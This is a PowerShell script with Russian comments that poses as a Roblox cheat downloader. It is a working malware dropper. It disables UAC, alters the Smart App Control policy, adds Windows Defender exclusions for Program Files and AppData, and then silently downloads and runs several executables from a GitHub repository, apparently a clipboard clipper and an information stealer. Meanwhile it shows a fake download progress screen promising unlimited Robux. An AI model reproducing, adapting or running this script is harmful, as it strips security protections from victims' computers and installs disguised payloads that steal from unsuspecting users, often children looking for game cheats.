# Создаём ключ, если его нет
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
# Устанавливаем значение 0 = Off
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
# 1. Изменяем параметр в реестре (как и раньше)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
# 2. Уведомляем систему об изменении, чтобы она применила настройки немедленно
# Эта команда имитирует рассылку сообщения всем окнам о смене системных параметров
rundll32.exe user32.dll,UpdatePerUserSystemParameters
# 3. Перезапускаем Проводник (Explorer.exe), который является основной оболочкой Windows
# Это самый важный шаг для немедленного применения изменений, связанных с UAC и UI.
Stop-Process -Name explorer -Force
# 4. (Опционально, но рекомендуется) Перезапускаем службы, которые могут зависеть от UAC
# Это помогает избежать возможных сбоев в программах, работающих в фоновом режиме.
Restart-Service -Name "wuauserv" -Force # Служба обновления Windows
Restart-Service -Name "bits" -Force # Служба фоновой интеллектуальной передачи
# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles
    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }
    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData
    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
   
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}
Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " $x86$", ""
        Add-MpPreference -ExclusionPath $updpath
        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }
        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData
        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
    # Запускаем 
    Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe    
    # Запускаем 
    Start-Process -FilePath "Umbralchik.exe" -WindowStyle Hidden
    
    # Удаляем файл через 5 секунды
   
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "informate.exe" -WindowStyle Hidden
     # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "SteamSetup.exe" -WindowStyle Hidden
    
Clear-Host
Write-Host ""
Write-Host "=======================================================" -ForegroundColor Red
Write-Host "████████╗██████╗ ██████╗ █████╗ ██████╗ ██╗ ██╗" -ForegroundColor Green
Write-Host "╚══██╔══╝██╔══██╗╚════██╗██╔══██╗██╔════╝ ██╔╝ ╚═╝" -ForegroundColor Green
Write-Host " ██║ ██████╔╝ █████╔╝███████║██║ ███╗███████╗ " -ForegroundColor Green
Write-Host " ██║ ██╔══██╗ ╚═══██╗██╔══██║██║ ██║╚════██║ " -ForegroundColor Green
Write-Host " ██║ ██║ ██║██████╔╝██║ ██║╚██████╔╝███████║ " -ForegroundColor Green
Write-Host " ╚═╝ ╚═╝ ╚═╝╚═════╝ ╚═╝ ╚═╝ ╚═════╝ ╚══════╝ " -ForegroundColor Green
Write-Host "=======================================================" -ForegroundColor Red
Write-Host " ROBLOX CHEAT DOWNLOADER " -ForegroundColor Yellow
Write-Host " Version 9.8.1 (Ultimate) " -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 2
Write-Host "Инициализация соединения с сервером..." -ForegroundColor Yellow
Start-Sleep -Seconds 3
Write-Host "Подключено к защищённому серверу (AES-256)" -ForegroundColor Green
Start-Sleep -Seconds 2
Write-Host "Проверка совместимости системы..." -ForegroundColor Magenta
Start-Sleep -Seconds 4
Write-Host "Система совместима и готова ✓" -ForegroundColor Green
Write-Host ""
Write-Host "Начинаем загрузку основного модуля..." -ForegroundColor Cyan
$totalSize = 1024MB
$downloaded = 0
$startTime = Get-Date
$files = @(
    "core.dll",
    "injector.exe",
    "aimbot_module.dat",
    "esp_overlay.bin",
    "speedhack_engine.so",
    "lua_executor.lib",
    "protection_shield.v2",
    "robux_tool.dll"
)
for ($i = 1; $i -le 100; $i++) {
    $downloaded = $totalSize * ($i / 100)
    $elapsed = (Get-Date) - $startTime
    $speed = if ($elapsed.TotalSeconds -gt 0) { $downloaded / $elapsed.TotalSeconds / 1MB } else { 0 }
    $remainingTime = [math]::Round((100 - $i) / ($i / $elapsed.TotalSeconds), 0)
    if ($remainingTime -lt 0) { $remainingTime = 0 }
    $progress = "=" * ($i / 2) + " " * (50 - $i / 2)
   
    Clear-Host
    Write-Host "ROBLOX CHEAT DOWNLOADER" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "[$progress] $i% " -NoNewline -ForegroundColor Green
    Write-Host "($([math]::Round($downloaded / 1MB, 1)) MB / 1024 MB)"
    Write-Host "Скорость: $([math]::Round($speed, 2)) MB/s ETA: $($remainingTime) сек."
    Write-Host ""
    Write-Host "Текущий файл: $($files[(Get-Random -Maximum $files.Count)])" -ForegroundColor Cyan
   
    Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 1200)
}
Clear-Host
Write-Host "=======================================================" -ForegroundColor Green
Write-Host " ЗАГРУЗКА ЗАВЕРШЕНА УСПЕШНО! " -ForegroundColor Yellow
Write-Host "=======================================================" -ForegroundColor Green
Write-Host "Файлы сохранены в временную папку." -ForegroundColor Cyan
Write-Host "Запуск модуля через 3... 2... 1..." -ForegroundColor Red
Start-Sleep -Seconds 3
Write-Host "ЗАПУСК УСПЕШЕН! Наслаждайся функциями ∞ Robux & God Mode активированы ✓" -ForegroundColor Magenta
Write-Host ""
Write-Host "Нажми любую клавишу для выхода..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")



